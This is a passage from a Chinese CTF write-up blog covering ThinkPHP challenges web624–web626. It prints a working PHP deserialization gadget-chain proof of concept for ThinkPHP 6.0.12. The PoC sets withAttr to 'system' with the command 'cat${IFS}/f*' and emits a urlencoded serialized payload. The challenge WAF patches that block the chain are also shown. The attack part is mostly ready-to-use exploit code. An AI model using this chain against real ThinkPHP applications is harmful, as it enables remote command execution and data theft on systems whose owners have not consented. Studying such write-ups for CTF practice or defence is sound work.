        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web624（6-0-12链）"><a href="#web624（6-0-12链）" class="headerlink" title="web624（6.0.12链）"></a>web624（6.0.12链）</h1><p>可以用6.0.12的链子打掉</p>
<p>poc：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span>

<span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key1"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"cat\$&#123;IFS&#125;/f*"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key1"</span><span class="token operator">=></span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>

<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$lazySave</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$withEvent</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$exists</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$force</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withEvent</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">force</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>waf：</p>
<p>..&#x2F;vendor&#x2F;topthink&#x2F;think-orm&#x2F;src&#x2F;model&#x2F;concern&#x2F;Attribute.php</p>
<p>果然是这里</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$relation</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getRelationValue</span><span class="token punctuation">(</span><span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>

          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getJsonValue</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
              <span class="token variable">$closure</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token variable">$value</span>   <span class="token operator">=</span> <span class="token variable">$closure</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web625（禁display）"><a href="#web625（禁display）" class="headerlink" title="web625（禁display）"></a>web625（禁display）</h1><p>上一题的poc秒了</p>
<p>waf：</p>
<p>..&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;view&#x2F;driver&#x2F;Php.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">display</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>
   <span class="token punctuation">&#123;</span>
       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web626（禁call）"><a href="#web626（禁call）" class="headerlink" title="web626（禁call）"></a>web626（禁call）</h1><p>上一题poc秒了</p>
<p>waf：</p>
<p>..&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;Validate.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'is'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>

       <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">,</span> <span class="token function">lcfirst</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

       <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2026 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>